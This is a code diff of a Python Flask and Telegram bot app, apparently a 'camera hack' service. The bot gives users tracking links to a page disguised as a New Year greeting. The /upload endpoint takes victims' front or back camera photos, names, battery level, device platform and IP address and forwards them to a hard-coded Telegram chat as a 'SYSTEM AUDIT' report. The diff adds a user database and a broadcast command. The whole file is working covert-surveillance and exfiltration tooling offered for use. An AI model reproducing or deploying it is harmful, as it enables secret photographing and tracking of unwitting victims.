@@ -1,28 +1,73 @@
-import os
-import base64
-import threading
+import os, base64, threading, sqlite3
 from flask import Flask, render_template, request, jsonify
 import telebot
 from telebot import types
 
 app = Flask(__name__)
-
-# Settings
+# Render Environment Variables में BOT_TOKEN जरूर डालें
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 CHAT_ID = "7162565886"
+ADMIN_ID = 7162565886 
 bot = telebot.TeleBot(BOT_TOKEN)
+
+def init_db():
+    conn = sqlite3.connect('users.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
+    conn.commit()
+    conn.close()
+
+def add_user(user_id):
+    try:
+        conn = sqlite3.connect('users.db')
+        c = conn.cursor()
+        c.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
+        conn.commit()
+        conn.close()
+    except: pass
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    # अभी Force Join हटा दिया गया है, सीधे लिंक मिलेगा
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    btn1 = types.InlineKeyboardButton("✨ GENERATE MAGIC LINK", url="https://happy-wishing-you.onrender.com")
-    btn2 = types.InlineKeyboardButton("👨‍💻 CONTACT ADMIN", url="https://t.me/Roshanali000")
-    markup.add(btn1, btn2)
+    add_user(message.chat.id)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("Camera hack 📸", callback_data="cam_menu"))
     
-    bot.send_message(message.chat.id, 
-        "<b>SYSTEM ONLINE ✅</b>\n\nYour AI New Year 2026 Audit link is ready. Click below to proceed.", 
-        parse_mode='HTML', reply_markup=markup)
+    msg = "Select service ✅\nClick on 'camera hack' your service is procced 👇👇"
+    bot.send_message(message.chat.id, msg, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def callback_query(call):
+    # अपनी Render URL यहाँ लिखें
+    base_url = "https://happy-wishing-you.onrender.com" 
+    
+    if call.data == "cam_menu":
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        btn_back = types.InlineKeyboardButton("📸Back camera 📸", callback_data="mode_back")
+        btn_front = types.InlineKeyboardButton("📸 Front Camera 📸", callback_data="mode_front")
+        btn_dual = types.InlineKeyboardButton("📸 Dual camera 📸", callback_data="mode_dual")
+        markup.add(btn_front, btn_back, btn_dual)
+        bot.edit_message_text("😃Select any service ✅", call.message.chat.id, call.message.message_id, reply_markup=markup)
+    
+    elif call.data.startswith("mode_"):
+        mode = call.data.split("_")[1]
+        track_link = f"{base_url}?m={mode}"
+        contact_markup = types.InlineKeyboardMarkup()
+        contact_markup.add(types.InlineKeyboardButton("🔥Contact admin ✅", url="https://t.me/Roshanali000"))
+        
+        response = f"😃 it's your track link 🔗👇👇\n\nUrl= {track_link}\n\n🤗 If any problem contact admin ✅"
+        bot.send_message(call.message.chat.id, response, reply_markup=contact_markup)
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast(message):
+    if message.from_user.id == ADMIN_ID:
+        text = message.text.replace("/broadcast ", "")
+        conn = sqlite3.connect('users.db')
+        users = conn.execute('SELECT user_id FROM users').fetchall()
+        conn.close()
+        for user in users:
+            try: bot.send_message(user[0], text)
+            except: pass
+        bot.reply_to(message, "✅ Broadcast Done!")
 
 @app.route('/')
 def index():
@@ -30,36 +75,19 @@ def index():
 
 @app.route('/upload', methods=['POST'])
 def upload():
-    try:
-        data = request.json
-        name = data.get('name', 'Unknown')
-        img_data = data.get('image')
-        info = data.get('info', {})
-        label = data.get('label', 'Audit Capture')
-
-        branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
-        
-        report = (
-            f"🛡️ <b>SYSTEM AUDIT: {label}</b>\n\n"
-            f"👤 <b>Target:</b> {name}\n"
-            f"🔋 <b>Battery:</b> {info.get('battery')}\n"
-            f"🌐 <b>IP Address:</b> {request.remote_addr}\n"
-            f"📱 <b>Device:</b> {info.get('platform')}\n\n"
-            f"{branding}"
-        )
-
-        if img_data:
-            img_bytes = base64.b64decode(img_data.split(',')[1])
-            bot.send_photo(CHAT_ID, img_bytes, caption=report, parse_mode='HTML')
-        return jsonify({"status": "success"})
-    except:
-        return jsonify({"status": "error"}), 500
-
-def run_bot():
-    bot.polling(none_stop=True)
+    data = request.json
+    branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
+    report = (f"🛡️ <b>SYSTEM AUDIT: {data.get('label')}</b>\n\n👤 <b>Target:</b> {data.get('name')}\n"
+              f"🔋 <b>Battery:</b> {data.get('info').get('battery')}\n📱 <b>Device:</b> {data.get('info').get('platform')}\n"
+              f"🌐 <b>IP:</b> {request.remote_addr}\n\n{branding}")
+    
+    if data.get('image'):
+        img_bytes = base64.b64decode(data.get('image').split(',')[1])
+        bot.send_photo(CHAT_ID, img_bytes, caption=report, parse_mode='HTML')
+    return jsonify({"status": "success"})
 
 if __name__ == "__main__":
-    threading.Thread(target=run_bot).start()
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    init_db()
+    threading.Thread(target=lambda: bot.polling(none_stop=True)).start()
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
     
